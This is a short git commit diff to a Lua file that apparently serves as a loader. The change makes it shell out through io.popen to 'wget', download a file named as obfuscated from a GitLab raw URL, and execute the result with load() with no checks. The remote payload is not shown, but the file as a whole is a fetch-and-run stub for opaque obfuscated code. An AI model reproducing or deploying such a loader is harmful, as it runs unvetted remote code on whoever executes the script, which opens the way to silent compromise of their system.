1f8d1c28afe7d6fa7a9c196c91bb1a893419d0c9
Fizly <140739513+XFizly@users.noreply.github.com>
2026-08-06 22:55:08 +0200

    Update lunex-obfuscated.lua

--- lunex-obfuscated.lua
+++ lunex-obfuscated.lua
@@ -1,12 +1,12 @@
-local https = require("ssl.https")
+local url = "https://gitlab.com/nexus.personnal/vias/-/raw/master/obfuscated_5631bf90.lua?ref_type=heads"
 
-local code, status = https.request(
-    "https://gitlab.com/nexus.personnal/vias/-/raw/master/obfuscated_5631bf90.lua"
-)
+local p = assert(io.popen('wget -qO- "' .. url .. '"', "r"))
+local code = p:read("*a")
+p:close()
 
-assert(code and status == 200, "Failed to load GitLab script")
+assert(code and #code > 0, "Failed to download GitLab script")
 
-local fn, err = loadstring(code)
+local fn, err = load(code)
 assert(fn, err)
 
 return fn()
